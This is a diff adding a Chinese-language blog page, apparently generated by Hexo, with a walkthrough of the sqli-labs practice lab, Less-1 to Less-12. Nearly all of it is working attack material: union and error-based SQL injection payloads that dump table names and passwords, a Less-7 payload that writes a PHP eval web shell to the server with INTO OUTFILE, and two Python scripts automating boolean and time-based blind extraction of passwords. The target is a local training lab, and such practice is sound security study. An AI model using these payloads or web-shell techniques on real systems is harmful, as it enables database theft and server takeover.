@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PRACTICE,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="之前的一些关于 sqli-labs 的练习">
+<meta name="keywords" content="PRACTICE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs">
+<meta property="og:url" content="https://tyaoo.github.io/2020/02/28/sqli-labs/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="之前的一些关于 sqli-labs 的练习">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-03-01T03:38:09.742Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs">
+<meta name="twitter:description" content="之前的一些关于 sqli-labs 的练习">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://tyaoo.github.io/2020/02/28/sqli-labs/">
+
+
+
+
+
+  <title>sqli-labs | Tyaoo's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tyaoo's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tyaoo.github.io/2020/02/28/sqli-labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tyaoo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tyaoo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-28T21:58:56+08:00">
+                2020-02-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>之前的一些关于 sqli-labs 的练习</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="Less-1（单引号-union-注入）"><a href="#Less-1（单引号-union-注入）" class="headerlink" title="Less-1（单引号 union 注入）"></a>Less-1（单引号 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos; union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,2,group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-2（无引号-union-注入）"><a href="#Less-2（无引号-union-注入）" class="headerlink" title="Less-2（无引号 union 注入）"></a>Less-2（无引号 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-3（单引号括号-union-注入）"><a href="#Less-3（单引号括号-union-注入）" class="headerlink" title="Less-3（单引号括号 union 注入）"></a>Less-3（单引号括号 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos;) union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+</span><br><span class="line"></span><br><span class="line">?id=&apos;) union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">?id=&apos;) union select 1,2,group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-4（双引号-union-注入）"><a href="#Less-4（双引号-union-注入）" class="headerlink" title="Less-4（双引号 union 注入）"></a>Less-4（双引号 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&quot;) union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+</span><br><span class="line"></span><br><span class="line">?id=&quot;) union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">?id=&quot;) union select 1,2,group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-5（单引号双注入）"><a href="#Less-5（单引号双注入）" class="headerlink" title="Less-5（单引号双注入）"></a>Less-5（单引号双注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database() limit 3,1), &apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select column_name from  information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 2,1), &apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select password from  users limit 0,1), &apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-6（双引号双注入）"><a href="#Less-6（双引号双注入）" class="headerlink" title="Less-6（双引号双注入）"></a>Less-6（双引号双注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database() limit 3,1), &apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&quot; union select 1,count(*),concat(&apos;~&apos;,(select column_name from  information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 2,1), &apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&quot; union select 1,count(*),concat(&apos;~&apos;,(select password from  users limit 0,1), &apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-7（一句话木🐎）"><a href="#Less-7（一句话木🐎）" class="headerlink" title="Less-7（一句话木🐎）"></a>Less-7（一句话木🐎）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@@datadir 读取数据库路径</span><br><span class="line">@@basedir MYSQL 获取安装路径</span><br><span class="line"></span><br><span class="line">?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;&apos; into outfile &apos;E:\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php&apos;--+</span><br><span class="line"></span><br><span class="line">上菜刀</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-8（单引号布尔盲注）"><a href="#Less-8（单引号布尔盲注）" class="headerlink" title="Less-8（单引号布尔盲注）"></a>Less-8（单引号布尔盲注）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost:8088/sqli-labs-master/Less-8/"</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">盲注结果：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">|- security</span></span><br><span class="line"><span class="string">    |- emails</span></span><br><span class="line"><span class="string">    |- referers</span></span><br><span class="line"><span class="string">    |- uagents</span></span><br><span class="line"><span class="string">    |- users</span></span><br><span class="line"><span class="string">        |- id</span></span><br><span class="line"><span class="string">        |- username</span></span><br><span class="line"><span class="string">        |- password</span></span><br><span class="line"><span class="string">            |- Dumb</span></span><br><span class="line"><span class="string">            |- ...</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="comment">#payload = "' or length(database())=" + str(i) + "#"</span></span><br><span class="line">        <span class="comment">#payload = "' or length((select table_name from information_schema.tables where table_schema=database() limit 4,1))=" + str(i) + "#"</span></span><br><span class="line">        <span class="comment">#payload = "' or length((select column_name from information_schema.columns where table_name='users' limit 2,1))=" + str(i) + "#"</span></span><br><span class="line">        payload = <span class="string">"' or length((select password from users limit 0,1))="</span> + str(i) + <span class="string">"#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            length = i</span><br><span class="line">            print(<span class="string">"【+】 right length: "</span> + str(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            print(<span class="string">"【*】 wrong length: "</span> + str(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = ord(<span class="string">'a'</span>)</span><br><span class="line">        right = ord(<span class="string">'z'</span>)</span><br><span class="line">        <span class="keyword">while</span> left != right:</span><br><span class="line">            mid = int((left + right) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment">#payload = "' or ASCII(mid(database()," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line">            <span class="comment">#payload = "' or ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 4,1)," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line">            <span class="comment">#payload = "' or ASCII(mid((select column_name from information_schema.columns where table_name='users' limit 2,1)," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line">            payload = <span class="string">"' or ASCII(mid((select password from users limit 0,1),"</span> + str(i) + <span class="string">",1))&gt;"</span> + str(mid) + <span class="string">"#"</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.get(url,params=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">                print(str(i) + <span class="string">" &gt; "</span> + chr(mid))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">                print(str(i) + <span class="string">" &lt;= "</span> + chr(mid))</span><br><span class="line">        password += chr(left)</span><br><span class="line">        print(<span class="string">"【+】 password: "</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    getLength()</span><br><span class="line">    getPayload()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-9（单引号时间盲注）"><a href="#Less-9（单引号时间盲注）" class="headerlink" title="Less-9（单引号时间盲注）"></a>Less-9（单引号时间盲注）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost:8088/sqli-labs-master/Less-9/"</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line">letters = string.ascii_letters <span class="comment"># lowercase</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">盲注结果：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">|- security</span></span><br><span class="line"><span class="string">    |- emails</span></span><br><span class="line"><span class="string">    |- referers</span></span><br><span class="line"><span class="string">    |- uagents</span></span><br><span class="line"><span class="string">    |- users</span></span><br><span class="line"><span class="string">        |- id</span></span><br><span class="line"><span class="string">        |- username</span></span><br><span class="line"><span class="string">        |- password</span></span><br><span class="line"><span class="string">            |- Dumb</span></span><br><span class="line"><span class="string">            |- ...</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="comment">#payload = "' or if(length(database())=" + str(i) + ",sleep(4),1)#"</span></span><br><span class="line">        <span class="comment">#payload = "' or if(length((select table_name from information_schema.tables where table_schema=database() limit 3,1))=" + str(i) + ",sleep(4),1)#"</span></span><br><span class="line">        <span class="comment">#payload = "' or if(length((select column_name from information_schema.columns where table_name='users' limit 2,1))=" + str(i) + ",sleep(4),1)#"</span></span><br><span class="line">        payload = <span class="string">"' or if(length((select password from users limit 0,1))="</span> + str(i) + <span class="string">",sleep(4),1)#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url,params=data,timeout=<span class="number">3</span>)</span><br><span class="line">            print(<span class="string">"【*】 present length: "</span> + str(i))</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            length = i</span><br><span class="line">            print(<span class="string">"【+】 right length: "</span> + str(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        left = ord('a')</span></span><br><span class="line"><span class="string">        right = ord('z')</span></span><br><span class="line"><span class="string">        while left != right:</span></span><br><span class="line"><span class="string">            mid = int((left + right) / 2)</span></span><br><span class="line"><span class="string">            payload = "' or if(ASCII(mid(database()," + str(i) + ",1))&gt;" + str(mid) + ",1,sleep(4))#"</span></span><br><span class="line"><span class="string">            #payload = "' or ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 4,1)," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line"><span class="string">            #payload = "' or ASCII(mid((select column_name from information_schema.columns where table_name='users' limit 2,1)," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line"><span class="string">            #payload = "' or ASCII(mid((select password from users limit 1,1)," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line"><span class="string">            data = &#123;</span></span><br><span class="line"><span class="string">                'id':payload</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            try:</span></span><br><span class="line"><span class="string">                r = requests.get(url,params=data,timeout=3)</span></span><br><span class="line"><span class="string">                left = mid + 1</span></span><br><span class="line"><span class="string">                print(str(i) + " &gt; " + chr(mid))</span></span><br><span class="line"><span class="string">            except requests.exceptions.ReadTimeout as e:</span></span><br><span class="line"><span class="string">                right = mid</span></span><br><span class="line"><span class="string">                print(str(i) + " &lt;= " + chr(mid))</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">        password += chr(left)</span></span><br><span class="line"><span class="string">        print("【+】 password: " + password)</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">            <span class="comment">#payload = "' or if(ASCII(mid(database()," + str(i) + ",1))=" + str(ord(j)) + ",sleep(4),1)#"</span></span><br><span class="line">            <span class="comment">#payload = "' or if(ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 3,1)," + str(i) + ",1))=" + str(ord(j)) + ",sleep(4),1)#"</span></span><br><span class="line">            <span class="comment">#payload = "' or if(ASCII(mid((select column_name from information_schema.columns where table_name='users' limit 2,1)," + str(i) + ",1))=" + str(ord(j)) + ",sleep(4),1)#"</span></span><br><span class="line">            payload = <span class="string">"' or if(ASCII(mid((select password from users limit 0,1),"</span> + str(i) + <span class="string">",1))="</span> + str(ord(j)) + <span class="string">",sleep(4),1)#"</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url,params=data,timeout=<span class="number">3</span>)</span><br><span class="line">                print(<span class="string">"【*】 present password: "</span> + str(i) + <span class="string">" = "</span> + j)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                password += j</span><br><span class="line">                print(<span class="string">"【+】 password: "</span> + password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    getLength()</span><br><span class="line">    getPayload()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-10（双引号时间盲注）"><a href="#Less-10（双引号时间盲注）" class="headerlink" title="Less-10（双引号时间盲注）"></a>Less-10（双引号时间盲注）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less-9 单引号改双引号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-11（用户名加密的单引号-union-注入）"><a href="#Less-11（用户名加密的单引号-union-注入）" class="headerlink" title="Less-11（用户名加密的单引号 union 注入）"></a>Less-11（用户名加密的单引号 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uname = admin&apos;#</span><br><span class="line"></span><br><span class="line">&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line"></span><br><span class="line">&apos; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;#</span><br><span class="line"></span><br><span class="line">&apos; union select 1,group_concat(password) from users#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-12（用户名加密的双引号括号-union-注入）"><a href="#Less-12（用户名加密的双引号括号-union-注入）" class="headerlink" title="Less-12（用户名加密的双引号括号 union 注入）"></a>Less-12（用户名加密的双引号括号 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname = admin&quot;)#</span><br><span class="line"></span><br><span class="line">less-11 单引号改双引号括号</span><br></pre></td></tr></table></figure>
+
